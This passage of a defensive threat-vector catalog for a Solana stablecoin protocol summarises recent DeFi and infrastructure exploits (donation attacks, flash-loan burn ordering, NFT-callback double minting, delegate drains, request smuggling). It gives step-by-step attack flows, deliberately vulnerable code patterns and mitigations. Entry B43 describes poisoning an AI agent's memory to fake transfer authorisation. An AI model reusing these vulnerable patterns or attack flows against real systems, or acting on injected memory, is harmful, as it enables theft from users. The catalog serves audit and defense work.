**Historical**: RustSec `RUSTSEC-2026-0020/0021/0022` (Wasmtime, 2026-02-24)
**Mechanism**: If a protocol embeds untrusted/partially-trusted Wasm components (strategy plugins, quote engines, simulation adapters), a malicious guest can force host-side over-allocation (large `string/list<T>`, unbounded resource handles, oversized HTTP header fields) to exhaust memory or trigger panic-abort. A second-stage trigger drops unresolved `call_async` futures and re-enters the same component instance, causing repeatable panic conditions.
**Key insight**: This is not classic on-chain logic exploitation. It is an **off-chain execution-plane kill switch** against keeper/simulator infrastructure that often has signing authority or trade-execution rights.
**Code/config pattern to find**:
```rust
// RISKY: Wasmtime/WASI embedding with default (or very high) limits
let mut store = Store::new(&engine, state);
// missing: store.set_hostcall_fuel(...)
// missing: resource_table.set_max_capacity(...)

let fut = typed_func.call_async(&mut store, params)?;
let _ = fut.await?; // if callers sometimes drop before completion, panic chain risk
```
**Defense**:
1. Enforce strict Wasmtime limits (`set_hostcall_fuel`, `set_max_capacity`, `max_http_fields_size`, `max_random_size`) per embedding
2. Treat any dropped unresolved `call_async` future as a terminal fault for that store/component instance (recreate fresh instance)
3. Run untrusted Wasm in a separate worker process with supervisor restart and signer isolation
4. Never colocate signing keys with Wasm execution workers
5. Patch Wasmtime to fixed versions (`>=24.0.6`, `>=36.0.6`, `>=40.0.4`, `>=41.0.4`)
**Source**: https://rustsec.org/advisories/RUSTSEC-2026-0020.html | https://rustsec.org/advisories/RUSTSEC-2026-0021.html | https://rustsec.org/advisories/RUSTSEC-2026-0022.html

### A39. Inherited Fork Vulnerability Blindspot
**Historical**: SagaEVM ($7M, January 2026), Roguelike chain EVM forks (recurring pattern)
**Mechanism**: A protocol forks an upstream EVM framework (e.g., Ethermint) that contains an unknown or newly discovered vulnerability. The forked code is treated as "already reviewed" base infrastructure. The attacker discovers the upstream bug and exploits it in the derivative protocol — in SagaEVM's case, crafting transactions that bypass Ethermint's precompile bridge validation logic to mint unlimited stablecoins without collateral, draining $7M.
**Key insight**: Fork inheritance creates a **transitive trust assumption**. Auditors review protocol-added code against the forked baseline but rarely re-audit the baseline itself. When upstream code has an undisclosed/unpatched vulnerability, all derivative protocols inherit it silently.
**Code/config pattern to find**:
```solidity
// Inherited precompile call — assumed safe from upstream fork
// No secondary validation of cross-chain message payload
function mintFromBridge(bytes calldata message) external onlyBridge {
    (address to, uint256 amount) = abi.decode(message, (address, uint256));
    _mint(to, amount);  // <-- assumes upstream bridge validated collateral
}
```
**Defense**:
1. Maintain a "fork delta manifest" — document every divergence from upstream and re-review upstream on each upstream security advisory
2. Subscribe to upstream security channels (e.g., Ethermint, Cosmos SDK) as a first-class dependency risk signal
3. Add independent on-chain collateral invariant checks at every mint entry point, regardless of bridging layer trust
4. Pin fork commit hashes and include in audit scope disclosure
**Source**: https://www.halborn.com/blog/post/explained-the-sagaevm-hack-january-2026

### B39. AI Code Reviewer False-Negative Trust Cascade
**Historical**: Immunefi Magnus Code Review Agent launch (Nov 2025), pattern generalizable to Copilot/Cursor-based review workflows
**Mechanism**: Teams integrate AI-powered PR review tools (static analysis, LLM-based) into their security workflow. As AI-reviewed PRs accumulate without incident, teams psychologically recalibrate the "human review required" threshold upward. When the AI tool has systematic blind spots (e.g., only covers Solidity+npm, misses economic/protocol-level logic, can't reason about cross-contract composability), those gaps become a structured, team-wide vulnerability surface — validated by apparent clean review history.
**Key insight**: The danger is not that AI misses something once. It is that **repeated clean AI verdicts lower human vigilance** for exactly the categories the AI cannot analyze. This is a meta-defense failure: the security tooling itself shapes the audit culture and coverage.
**DeFi-specific blind spots of current AI code review tools**:
- Economic/tokenomics logic (correct code, wrong incentive design)
- Multi-tx / multi-block attack sequences
- Cross-protocol composability when external contracts change post-audit
- Admin key / operational security alignment
- Anything outside declared scope (language, npm ecosystem, line-count limits)
**Defense**:
1. Explicitly document AI tool coverage boundaries and require manual sign-off for categories outside those boundaries
2. Maintain a "human review required" checklist independent of AI verdicts — especially for oracle integration, mint/redeem logic, and privilege escalation paths
3. Treat AI review as a first-pass filter, not an audit substitute; audit velocity should never exceed human review capacity for critical paths
4. Red-team the AI reviewer periodically: submit known-vulnerable PRs and verify it catches them
**Source**: https://immunefi.com/blog/company-announcement/code-review-agent/ | https://securityboulevard.com/2026/01/why-smart-contract-security-cant-wait-for-better-ai-models/

### A40. ERC4626/Share-Price Donation Attack via Wrapped Stablecoin
**Historical**: Inverse Finance / LlamaLend (2026-03-02, ~$240K) — sDOLA share-price manipulation forced liquidation of 27 users on LlamaLend using ~$30M flash loans.
**Mechanism**: The attacker exploited the ERC4626 vault model where `share_price = totalAssets / totalSupply`. By flash-loan-donating DOLA directly into the sDOLA vault (inflating `totalAssets`), the share price of sDOLA spiked. External lending protocols (LlamaLend) that used sDOLA as collateral read the now-inflated exchange rate, making collateral positions appear undercollateralized → forced liquidations. Attacker profits from the liquidation spread.
**Key insight**: The donation attack does not exploit the vault itself — it exploits any **external protocol that reads the vault's share price** as collateral valuation. The vault contract was "working correctly"; the composability surface was the exploit path.
**Relationship to existing vectors**: This is a composability amplification of A2 (Flash Loan) and A3 (Oracle Manipulation), but the oracle being manipulated is the vault's own `totalAssets/totalSupply` ratio rather than a Pyth feed.
**Code pattern to find**:
```rust
// VULNERABLE: share price derived from raw totalAssets (donatable by anyone)
fn get_share_price(vault: &Vault) -> u64 {
    vault.total_assets / vault.total_shares  // totalAssets inflatable via direct transfer
}

// SAFE: Microstable uses tracked accounting field (not raw token balance)
// vault.total_deposits is only updated via mint() / redeem() instructions
// Direct SPL token transfers to vault ATA do NOT update total_deposits
```
**Microstable relevance**: ✅ **DEFENDED** — Microstable tracks `vault.total_deposits` as an explicit accounting field updated only through program instructions (`mint`, `redeem`, `rebalance`). Raw SPL token transfers (donations) to vault ATAs do NOT update this field, so share-price inflation via donation is not possible in the current architecture.
**Risk surface if composability changes**: If Microstable is ever used as collateral in an external lending protocol (e.g., a future "Microstable Lend"), and that protocol reads the MSTB/collateral ratio from on-chain supply accounting, it must verify that `total_deposits` cannot be inflated externally before using it for collateral valuation.
**Defense**:
1. Never use raw SPL token account balance as share-price numerator — always use tracked accounting fields
2. For any ERC4626-style wrapper over protocol assets, add donation-resistant floor: `share_price = max(tracked_assets, real_balance) / total_shares` with donation detection alarm
3. Before listing protocol tokens as collateral in external protocols, audit their oracle adapter for donation-attack resistance
4. Monitor vault `totalAssets / totalShares` ratio for sudden jumps within a single block (on-chain anomaly flag)
**Source**: https://www.cryptotimes.io/2026/03/02/inversefinance-faces-240k-loss-in-dola-manipulation-alert/ | https://hacked.slowmist.io/

### A41. Burn-Path Fee-Exempt Flash Loan Amplification
**Historical**: SOF token (BNB Chain, 2026-02-14, ~$248K) + LAXO token (2026-02-22, ~$190K) — Burn logic with fee-exempt transfer path allowed flash-loan amplification, draining pool BSC-USD. Copycat attackers struck within 13 minutes of the LAXO breach.
**Mechanism**: The vulnerable contracts had a "mining reward" path that exempted tokens from transfer fees when sent to the mining contract. The attack chain:
1. Flash borrow ~$590M in assets
2. Swap large BSC-USD for pool token (SOF/LAXO) — pool is now token-heavy, USD-light
3. Send tokens to the fee-exempt mining contract (skips transfer fee, pool balances update before payout)
4. The mining contract burns tokens — supply drops, updating pool balances BEFORE computing payout
5. Claim the ~875 reward SOF tokens
6. Sell reward tokens back into the now-skewed pool — the pool's exchange rate is based on heavily distorted token/USD ratio
7. Drain entire pool USD, repay flash loan, pocket profit
**Key insight**: The vulnerability combines two flaws: (a) a fee-exempt path that bypasses normal transfer accounting, and (b) burn-then-payout ordering that allows the burn step to change the denominator before the payout is computed.
**Code pattern to find**:
```solidity
// VULNERABLE: fee-exempt path + burn-before-payout ordering
function claimReward(address user) external {
    uint256 reward = pendingReward[user];
    _burnFeeExempt(rewardToken, user, reward);  // burn first → supply drops → price inflates
    uint256 payout = (vault.balance * reward) / rewardToken.totalSupply();  // too late
    vault.transfer(user, payout);
}

// SAFE: compute payout before any state-changing burn
function claimReward(address user) external {
    uint256 reward = pendingReward[user];
    uint256 payout = (vault.balance * reward) / rewardToken.totalSupply();  // compute first
    _burn(rewardToken, user, reward);
    vault.transfer(user, payout);
}
```
**Microstable relevance**: ✅ **DEFENDED** — Microstable has no mining/reward contract with fee-exempt transfer paths. The `redeem()` instruction applies fees uniformly via `effective_redeem_fee_rate` and follows CEI pattern: fee is computed before any state modification, and burn is applied against `total_supply` before payout is calculated. The per-slot flow caps (`MAX_ABSOLUTE_REDEEM_PER_SLOT`) also limit flash-loan-scale extraction even if a similar logic flaw existed.
**Watch for**: If any future yield-farming or reward mechanism is added to Microstable, verify that: (a) no fee-exempt paths exist, (b) all payout computations occur before burn/transfer actions that change the denominator.
**Defense**:
1. **CEI (Checks-Effects-Interactions)**: compute payout amount BEFORE executing burn
2. No fee-exempt transfer paths — apply fees uniformly including during reward claims
3. Flash loan guard: if `supply_after_burn / supply_before_burn` changes by more than N%, reject the redemption
4. Per-tx payout cap: no single transaction can drain more than X% of pool BSC-USD
5. Copycat prevention: once a vulnerability is exploited, pause the affected function within the same block using monitoring hooks
**Source**: https://www.cryptotimes.io/2026/02/27/flash-loan-attack-drains-438k-from-sof-and-laxo-on-bnb-chain/

### A42. Anchor Post-CPI Stale Account Cache
**Signal**: Asymmetric Research "Invocation Security" (Apr 2025); resurfaced 2026-03-03.
**Mechanism**: In Anchor, `Account<'info, T>` data is deserialized at instruction entry. If a CPI call (e.g., Token-2022 transfer hook) modifies the same PDA on-chain during the instruction, Anchor's in-memory struct still holds pre-CPI values. Reading from the struct post-CPI yields stale data — price, balance, or state may be wrong. Attack: if a vault account is updated by a Token-2022 hook triggered during `transfer_checked`, the outer program's cached price is pre-hook and may be exploited to over-mint.
**Why distinct from A12 (CPI Confusion)**: No wrong program is called. The CPI target is correct; the flaw is trusting cached data after a valid CPI mutates the account.
**Code pattern to find**:
```rust
// VULNERABLE: vault data cached before CPI, not reloaded after
let price = ctx.accounts.vault.price;  // cached at entry
token_2022::transfer_checked(...)?;    // hook may modify vault.price
let mint_amount = collateral * price;  // stale price used!

// SAFE: reload after CPI
token_2022::transfer_checked(...)?;
ctx.accounts.vault.reload()?;
let price = ctx.accounts.vault.price;  // fresh
```
**Trigger condition**: Token-2022 transfer hooks + writable PDA in same instruction.
**Defense**: Call `.reload()?` on any PDA that a CPI might have modified. Add as a mandatory code review checklist item before any Token-2022 migration.
**Source**: https://blog.asymmetric.re/invocation-security-navigating-vulnerabilities-in-solana-cpis/

### B40. ACE Fairness / Keeper Oracle-Freshness Ordering Collapse
**Signal**: Blockdaemon Solana 2026 technical roadmap (2026-02-19). Alpenglow + ACE "limits opportunistic reordering."
**Mechanism**: Protocols relying on priority-fee-based ordering for security (e.g., keeper oracle updates land before user mints) lose that guarantee under ACE fair-ordering. The keeper's oracle-update TX no longer predictably precedes user TXs in the same block under congestion. This means user TXs may execute on stale oracle data, relying entirely on the protocol's staleness guard as the last line of defense. If the staleness guard is the only protection and keeper cycle latency increases under ACE, the window of oracle staleness widens.
**Microstable impact**: Protocol transitions from "keeper ordering protects freshness" to "staleness check alone protects freshness" — structural model shift.
**Not a value-extraction attack** if staleness checks hold, but creates liveness degradation under congestion (OracleDegraded reverts) and a narrower safety margin.
**Defense**: (1) Redundant keeper runner on separate node; (2) Pre-benchmark keeper cycle under ACE congestion; (3) Consider widening staleness guard slightly while tightening confidence checks.
**Source**: https://www.blockdaemon.com/blog/solana-in-2026-technical-roadmap

### A43. Commit/Reveal Threshold Circumvention via Turnover Segmentation
**Signal**: Direct Microstable code audit, 2026-03-03.
**Mechanism**: Protocols that require commit/reveal only above a turnover/value threshold can be bypassed by splitting a large operation into multiple smaller sub-threshold ones. Each sub-operation passes without triggering the commit/reveal delay. Over N steps, attacker achieves the full cumulative effect of the large operation — while avoiding all the front-running protection, delay, and transparency that commit/reveal provides.
**Solana/Anchor specifics**: Applies to any instruction with: `if value >= threshold { require_commit_reveal() }`. Attacker simply keeps each call's `value < threshold` and batches across multiple slots.
**Code pattern to find**:
```rust
// VULNERABLE: single-call threshold only, no cumulative tracking
if turnover >= LARGE_REBALANCE_THRESHOLD {
    verify_commit_reveal()?;  // only triggered per-call
}
// Attacker: call 10x with turnover < threshold each time
// = same total effect, no commit/reveal ever fired
```
**Arithmetic (Microstable example)**: LARGE_REBALANCE_THRESHOLD=4%, WEIGHT_STEP_LIMIT=2%, BATCH_WINDOW_SLOTS=32. Attacker can zero out one collateral weight from 10% → 0% in 5 calls × 32 slots = 160 slots ≈ 64 seconds.
**Defense**: Track per-epoch cumulative drift. If `sum(|current_weight - epoch_start_weight|) > THRESHOLD`, require commit/reveal regardless of per-call turnover.
**Source**: Microstable lib.rs lines 1534–1600

### B41. Audit Multi-Engagement Scope Fragmentation
**Signal**: SigIntZero 2026 Software Security Report (Feb 28, 2026); Euler Finance ($197M, 6 auditors, 10 engagements).
**Mechanism**: When a protocol is audited by multiple firms across multiple engagements, each auditor reviews their assigned scope in isolation. Cross-function interactions — especially between modules audited by different firms — become structurally orphaned: no single auditor reviews the interface between their scope and the adjacent module. In Euler Finance, `donateToReserves()` was only in scope for 1 of 10 engagements; the interaction with the lending mechanism (the actual exploit path) was never evaluated end-to-end.
**Why distinct from A34 (Fragmented Security Stack)**: A34 is about different security *layers* (audit + bounty + monitoring) not talking to each other. B41 is about multiple auditors within the audit layer each covering disjoint code *scopes*, with cross-scope interactions falling through.
**Meta pattern**: "More auditors → more safety" assumption is wrong. More auditors with disjoint scopes → higher probability of interface-level blind spots.
**Code pattern to find**: Functions that call into another module not in the current audit scope. Cross-module call sites where the caller and callee were audited by different firms.
**Defense**:
1. Require one auditor per engagement to perform explicit **cross-scope integration review** — specifically testing all function interactions across audit scope boundaries.
2. Maintain a "scope overlap matrix": for every pair of audited modules, record which firm reviewed their interface.
3. Treat any function in scope for only 1 engagement as HIGH risk; escalate to mandatory secondary review.
**Microstable relevance**: If future audits use multiple firms (e.g., one for Keeper, one for on-chain contracts), require explicit review of the Keeper ↔ on-chain data handoff boundary.
**Source**: https://www.prweb.com/releases/2026-software-security-report-audited-applications-account-for-only-10-8-of-exploit-losses---but-the-failures-reveal-a-systemic-blind-spot-302699518.html

### B42. Audit Severity Miscalibration — Informational-to-Critical Escalation Blindspot
**Signal**: SigIntZero 2026 Report; CertiK-audited Merlin DEX ($1.8M), Swaprum ($3M), Arbix Finance ($10M) — all exploited via admin privilege abuse that audits flagged as *informational* findings.
**Mechanism**: Auditors correctly identify a vulnerability (e.g., centralized admin key can rug-pull users) but classify it as "informational" or "low" because the code logic is syntactically correct. The business risk — "team could drain the protocol" — is treated as a trust assumption, not a severity-raising factor. Exploiters (including insiders or compromised devs) then execute exactly the "informational" attack path.
**Why distinct from B39 (AI code reviewer false-negative)**: B39 is about AI tooling creating false safety perception. B42 is about human auditors correctly flagging but systematically underrating severity when code is correct but business intent is malicious.
**Economic logic**: Admin privilege exploits are rated informational because "the team is trusted." But every malicious insider hack and rug-pull exploits this assumption. The severity of a finding should include the worst-case business outcome, not just code-level impact.
**Meta pattern**: "Code-level severity heuristic ignores economic blast radius of operational trust assumptions."
**Code pattern to find**: Admin-only functions with no timelock/multisig. `only_admin` guards on drain/pause/mint functions. Informational findings in audit reports involving "centralization risk."
**Defense**:
1. Any admin-only function that can affect user funds without timelock → automatically MEDIUM severity floor.
2. Run a "finding re-calibration pass" on past audits: re-score all informational findings for economic blast radius.
3. Require timelock (≥24h) on all privileged operations affecting liquidity.
4. Include a "Trust Assumption Attack Tree" in every audit deliverable: what happens if admin/team is compromised or malicious?
**Microstable relevance**: Review all past audit findings classified as informational/low involving keeper authority, oracle authority, or admin keys. Re-evaluate each for worst-case economic blast radius.
**Source**: https://www.prweb.com/releases/2026-software-security-report-audited-applications-account-for-only-10-8-of-exploit-losses---but-the-failures-reveal-a-systemic-blind-spot-302699518.html

### B43. AI Agent Memory Injection Attack
**Signal**: Princeton University & Sentient Foundation — "AI Agents in Cryptoland: Practical Attacks and No Silver Bullet" (2026).
**Mechanism**: AI agents managing crypto wallets store conversation history, cached authorizations, and task context in a memory system. An attacker injects malicious data into the agent's memory — via poisoned tool outputs, crafted chat messages, or adversarial documents in the agent's knowledge base — to make the agent believe it has prior authorization to transfer funds to a specific address. The agent then executes the transfer based on this false memory, without re-verifying with the human principal.
**Why distinct from B29 (Confused-Deputy)**: B29 = agent given excessive permissions at design time. B43 = agent's runtime memory is poisoned to *believe* it has authorization it was never granted.
**Why distinct from B37 (Steganographic Oversight Evasion)**: B37 = covert signals between cooperating malicious agents. B43 = adversarial memory pollution of a single honest agent.
**Why distinct from B38 (Multi-turn Boundary Takeover)**: B38 = accumulated context drift across conversation turns. B43 = external adversarial injection into the memory store itself (not just conversation drift).
**Architecture components at risk**: Memory System (conversation history, user preferences), Decision Engine (LLM trust in cached context), Action Module (wallet/transaction execution).
**DeFi-specific risk**: Blockchain transactions are irreversible. A single successful memory injection that redirects one transaction is permanent and unrecoverable.
**Code pattern to find**: AI agents that (a) cache prior authorization events in memory, (b) use memory context to skip re-verification, (c) accept external documents or tool results as authoritative memory inputs.
**Defense**:
1. **Ephemeral authorization model**: Never cache "user authorized X" in persistent memory. Re-verify authorization at every execution step.
2. **Memory isolation**: Separate untrusted external data (research context, tool outputs) from trusted authorization context. Never mix.
3. **Action confirmation gate**: All irreversible actions (transactions above threshold) require explicit out-of-band human confirmation regardless of memory state.
4. **Memory integrity logging**: Log all memory writes with source attribution; flag any write from external tool output that references authorization or transfer permissions.
**Microstable relevance**: If any AI agent is used for keeper operation, governance proposal drafting, or treasury management, apply ephemeral authorization + confirmation gate. Agent ↔ Governance ↔ Parameter chain is highest risk.
**Source**: https://blog.sentient.xyz/posts/ai-agents-in-cryptoland

### B44. SPL Token Account Persistent Delegate Drain (Solana)
**Historical**: Ledger/Canissolana incident (2026-03-02/03, ~$30K USDC on Solana) — USDC drained from hardware-wallet-secured account with no recent user interaction.
**Mechanism**: SPL token accounts (and Token-2022 accounts) have a separate `delegate` field alongside the `owner` field. A token delegate, once approved via `Approve` instruction, can transfer up to `delegated_amount` tokens WITHOUT the account owner's signature on subsequent transactions. Attack chain:
1. User interacts with a malicious or compromised dApp and signs an `Approve` instruction, setting the attacker's address as delegate on their USDC ATA with a large or max `delegated_amount`
2. User closes the dApp session and forgets the delegation was ever granted
3. Weeks or months later, attacker executes `Transfer`/`TransferChecked` from the delegated USDC account to their own address — requires only the delegate's signature, NOT the owner's
4. Funds drain silently; no new signature from victim required
**Solana Token-2022 amplification**: The `PermanentDelegate` extension assigns an irrevocable delegate authority at mint creation time that can transfer ALL token accounts of that mint without per-account approval. If a stablecoin mint ever enables `PermanentDelegate`, the mint authority's compromise = full drain of all holders.
**Why distinct from B15 (Key Compromise)**: No private key is stolen. The attacker holds a legitimately granted authorization that the user forgot to revoke. The on-chain action is "valid" from the program's perspective.
**Why distinct from A6 (Account Substitution)**: A6 is about the protocol accepting wrong accounts. B44 is about a user's token account having a latent attacker-controlled delegation that the protocol cannot detect or prevent.
**Code pattern to find**:
```rust
// SOLANA RISK: any instruction that accepts user-supplied collateral token account
// must check that no active delegate exists, OR enforce CpiGuard
pub fn mint(ctx: Context<Mint>, ...) -> Result<()> {
    // VULNERABLE: no check for ctx.accounts.user_collateral_ata.delegate
    // If delegate is set to attacker, attacker can route this transfer
    token::transfer_checked(
        ctx.accounts.into_transfer_ctx(),
        collateral_amount,
        COLLATERAL_DECIMALS_EXPECTED,
    )?;
}

// SAFER: verify no active delegate before accepting collateral
let user_ata = &ctx.accounts.user_collateral_ata;
require!(
    user_ata.delegate.is_none(),
    ErrorCode::DelegateNotAllowed
);
// OR: use Token-2022 CpiGuard to block any CPI-mediated transfers
```
**Microstable relevance**: 
- Vault ATAs are PDA-owned by `protocol_state` — external parties CANNOT set delegates on vault ATAs. ✅ Protocol funds are safe.
- User-side collateral ATAs: Microstable accepts collateral via `transfer_checked` from user's own ATA. A malicious delegate could initiate this transfer without the user's knowledge. **The attacker would deposit into Microstable and receive MSTB — effectively laundering the stolen collateral through the protocol.**
- This is a user-protection gap, not a protocol-safety gap, but protocol-level delegate rejection would prevent Microstable from being used as a drain conduit.
**Mitigation for Microstable**:
1. Add `require!(ctx.accounts.user_collateral.delegate.is_none(), ErrorCode::DelegateNotAllowed)` to `mint()` instruction — prevents protocol from being used as launder vector
2. If Token-2022 collateral is ever added, explicitly check for and reject `PermanentDelegate` extension
3. User-facing: emit on-chain event when mint is called with any delegated account (monitoring hook)
**Defense**:
1. Protocols: reject user ATAs with active delegates for collateral deposit instructions
2. Wallet UX: display active delegates prominently; prompt for revocation on token account view
3. Users: periodically run `spl-token accounts --verbose` to audit active delegates; revoke immediately after dApp use
4. Monitoring: alert on any `Approve` instruction that sets a delegate on accounts holding >$1K in stablecoins
**Source**: https://www.cryptotimes.io/2026/03/03/ledger-under-scrutiny-30k-usdc-vanishes-from-air-gapped-wallet/ | https://solana.com/docs/tokens/extensions/permanent-delegate

### A46. ERC721 Callback Reentrancy / Dual-Execution Mint (NFT onReceived Double-Mint)
**Historical**: Solv Protocol — BitcoinReserveOffering BRO vault (2026-03-06, $2.7M / 38.0474 SolvBTC → 1,211 ETH)
**Mechanism**: When `mint()` is called, the contract initiates an ERC721 NFT transfer. During the transfer, `onERC721Received()` fires in the same receiver contract. Inside this callback, `_mint()` is called and tokens are minted at the current exchange rate. After the callback returns, execution resumes in the original `mint()` function — which **also calls `_mint()` again** at the same exchange rate. Because both paths execute within a single transaction (exchange rate constant throughout), each call to `mint()` effectively mints **twice the intended tokens** for the same collateral. Repeating this 22 times in one TX turned 135 BRO into 567,000,000 BRO. The inflated tokens were swapped BRO → SolvBTC → WBTC → WETH → ETH.
**Why distinct from A1 (Classic Reentrancy)**: A1 (The DAO style) requires an attacker-controlled `fallback()` that re-enters the vulnerable function before state is updated, enabling an extraction loop. A46 is **not a loop re-entry** — it is a **dual-execution path fault** where the same contract's own code calls `_mint` through two separate execution branches (callback path AND continuation path) within one call to `mint()`. No re-entry into the same function by an external actor is needed; the design itself creates two mint paths.
**Why distinct from A10 (Logic Bug)**: A10 covers general business logic errors. A46 is specifically the class of logic failure arising from the interaction between an ERC721 transfer callback and the calling function — a callback-triggered dual-execution pattern with defined industry prevalence and detection methodology.
**Attack flow (Solv Protocol)**:
1. Attacker calls `BitcoinReserveOffering.mint(goefs_amount, nftId)` with 135 BRO worth of GOEFS + NFT #4932
2. `mint()` calls `nft.transferFrom(user, contract, nftId)` → triggers `onERC721Received()` callback
3. Inside callback: `_mint(attacker, amount_at_exchange_rate)` → BRO minted (first occurrence)
4. Callback returns `IERC721Receiver.selector`; execution resumes in `mint()`
5. `mint()` continues and calls `_mint(attacker, amount_at_same_exchange_rate)` again (second occurrence)
6. Steps 1–5 repeated 22× in single TX (exchange rate unchanged) → exponential inflation
7. Final: 567M BRO → swap 165M BRO to SolvBTC → WBTC → WETH → 1,211 ETH withdrawn
**Code pattern to find**:
```solidity
// VULNERABLE: _mint called in both the callback AND the calling function
function mint(uint256 nftId, uint256 goefsAmount) external {
    // ... validate, transfer GOEFS ...
    nft.transferFrom(msg.sender, address(this), nftId);  // triggers onERC721Received
    // BUG: _mint also called here after callback returns → double mint
    _mint(msg.sender, computeAmount(exchangeRate));
}

function onERC721Received(address, address from, uint256, bytes calldata) external returns (bytes4) {
    // BUG: _mint called inside callback — should NEVER mint here
    _mint(from, computeAmount(exchangeRate));
    return IERC721Receiver.onERC721Received.selector;
}

// SAFE: _mint called EXACTLY once; never inside callbacks
function mint(uint256 nftId, uint256 goefsAmount) external nonReentrant {
    // ... validate, burn GOEFS ...
    nft.transferFrom(msg.sender, address(this), nftId);
    // Callback returns without minting (or callback not implemented)
    _mint(msg.sender, computeAmount(exchangeRate));  // single authoritative mint
}
```
**Solana relevance**: ✅ **NOT APPLICABLE** to Microstable — SPL Token classic has no transfer hook mechanism; no ERC721 `onReceived` callback exists in the current Solana token model. Token-2022 does support transfer hooks, but Microstable uses classic SPL Token. Even with Token-2022, the specific A46 pattern requires `_mint` to be placed both inside the hook AND after the hook call site — which Microstable's CEI pattern prevents.
**Defense**:
1. **Never call `_mint` / `_burn` inside ERC721/ERC1155 callbacks** — callbacks should validate and return only
2. **CEI (Checks-Effects-Interactions)**: update minted supply / user balances BEFORE the external NFT transfer call
3. **`nonReentrant` modifier** on all `mint()` / `burn()` functions that perform external token/NFT transfers
4. **Callback contract audit gate**: if your contract implements `onERC721Received`, add to audit checklist: "does this callback modify supply-critical state?"
5. **State-idempotency guard**: track a per-callstack `_minting` flag (or use transient storage EIP-1153) that prevents any re-execution of mint logic once it has started
6. **Token-2022 note (Solana)**: if hooks are ever added, `.reload()` account cache post-hook AND add single-execution guard for the mint CPI path
**Source**: https://www.quillaudits.com/blog/hack-analysis/solv-protocol-exploit | https://hacked.slowmist.io/ | https://financefeeds.com/solv-protocol-exploit-drains-2-7m-in-solvbtc-from-bro-vault/ | https://coincentral.com/solv-protocol-seeks-fund-return-after-2-7m-crypto-exploit/

### D35. RPC Proxy HTTP Request Smuggling (pingora-core)
**Historical**: RUSTSEC-2026-0033, CVE-2026-2833, CVSS 9.3 CRITICAL (Cloudflare pingora-core <0.8.0, reported 2026-03-04, issued 2026-03-05)
**Mechanism**: Pingora-based reverse proxies (<v0.8.0) immediately forward bytes following a request with an `Upgrade` header to the backend — without first waiting for the backend's `101 Switching Protocols` response. An attacker exploits this timing gap to inject (smuggle) a second malicious request to the backend. Because the smuggled request arrives through an already-established, authenticated proxy tunnel, it bypasses proxy-level security controls: WAF rules, IP allowlists, authentication headers, and rate limits applied at the proxy layer are not evaluated for the smuggled content.
**DeFi infrastructure attack chain**:
1. Attacker identifies a keeper, RPC gateway, or admin API endpoint that is fronted by a Cloudflare/Pingora proxy
2. Sends a crafted HTTP/1.1 request with `Connection: Upgrade` and `Upgrade: <protocol>` headers
3. Before the backend sends `101 Switching Protocols`, attacker's bytes are forwarded directly to the RPC server
4. Smuggled bytes form a second valid HTTP/1.1 request to an admin-only RPC method (`sendTransaction`, `setNodeVersion`, or custom admin RPC) — bypassing WAF rules that block those methods for external callers
5. RPC server processes the smuggled request as if it came from the proxy's trusted internal network
**Why distinct from D27 (RPC Endpoint Takeover)**: D27 is about DNS/BGP hijacking the routing path to a legitimate RPC (full endpoint substitution). D35 is an application-layer smuggling attack on an existing, legitimate proxy connection — the routing is correct; the attacker piggybacks inside an authenticated proxy session.
**Why distinct from B14 (RPC Manipulation)**: B14 covers MITM or compromised RPC returning false state. D35 does not require MITM or endpoint compromise — it exploits the proxy's own HTTP parsing logic to bypass its security controls.
**Code/config pattern to find**:
```yaml
# VULNERABLE: Pingora reverse proxy <0.8.0 in front of RPC endpoints
# GCP/Cloudflare reverse proxy config — any pingora-core dependency
[package]
pingora-core = "0.7.*"  # vulnerable — upgrade to >=0.8.0

# SAFER: patched version
pingora-core = "0.8.0"  # patched CVE-2026-2833

# ALTERNATIVE: Restrict Upgrade-header handling at proxy edge
# Reject or strip Upgrade headers for RPC-bound traffic (JSON-RPC over HTTPS has no legitimate use for WebSocket upgrades)
location /rpc {
    proxy_set_header Upgrade "";
    proxy_set_header Connection "";
}
```
**Microstable relevance**:
- Microstable keeper Cargo.lock: `pingora-core` NOT present → **keeper binary is NOT directly vulnerable** ✅
- BUT: TOOLS.md documents GCP VM (34.19.69.41) running **Traefik v3.6.1 + Cloudflare** as a proxy layer for services. If Cloudflare's CDN edge or any Cloudflare-managed Pingora instance routes keeper/RPC traffic, unpatched Pingora instances in that path expose the backend RPC to smuggling.
- If any internal service (oracle feed relay, keeper webhook receiver, admin API) is proxied through a Pingora-based gateway, those services' security controls may be bypassed.
- **Risk scenario**: An attacker in the same datacenter or co-tenant network segment sends a crafted Upgrade request to the Cloudflare-fronted oracle API. The smuggled request reaches the GCP VM's internal service (bypassing WAF rules) and triggers an unauthorized oracle price write or admin operation.
**Defense**:
1. **Patch immediately**: upgrade all `pingora-core` deployments to >=0.8.0
2. **Strip/reject Upgrade headers** at the edge for all RPC and internal API routes (JSON-RPC has no valid use for `Upgrade`)
3. **Verify Cloudflare CDN version**: confirm Cloudflare's managed Pingora instances are on patched versions for any worker/proxy config in the keeper path
4. **Audit all proxy layers** between keeper and RPC endpoints; document which use Pingora and verify versions
5. **RPC response integrity**: if feasible, sign or hash expected RPC responses so smuggling-induced injections fail response validation
6. **HTTP/2 for all internal RPC traffic**: HTTP/2 does not have the same `Upgrade` ambiguity vulnerability; migrate critical keeper↔RPC connections to HTTP/2 where possible
**Source**: https://rustsec.org/advisories/RUSTSEC-2026-0033 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-2833 | https://blog.cloudflare.com/resolving-a-request-smuggling-vulnerability-in-pingora/

## Why Audits Miss It — Vector Notes (Purple Reinforcement)

| Vector | 왜 감사가 놓치는가 (메타 원인) |
|---|---|
| A1 Reentrancy | 함수 단위 체크리스트에 치우쳐 cross-function reentry 경로를 축약 평가. |
| A2 Flash Loan | 단일 TX 시뮬레이션/경제 모델링 부족으로 자본 무제한 가정이 빠짐. |
| A3 Oracle Manipulation | feed 단위 검증은 하지만 unit-composition(비율×USD) 검증이 누락됨. |
| A4 Access Control | 코드 권한만 보고 키 운영/서명 정책(HSM·MPC)까지 확장 점검을 생략. |
| A5 Overflow | 정상 범위 테스트 중심, 극단 경계값과 타입 승격 경로를 충분히 안 밟음. |
| A6 Account Substitution | 계정 owner/address 제약을 “프레임워크가 해준다”는 가정에 의존. |
| A7 Signature Replay | 도메인 분리(chain/program/nonce) 전수 확인 대신 happy-path 서명 검증만 수행. |
| A8 Front-running | 온체인 로직 감사로 끝내고 mempool/ordering 위협모델을 범위 밖 처리. |
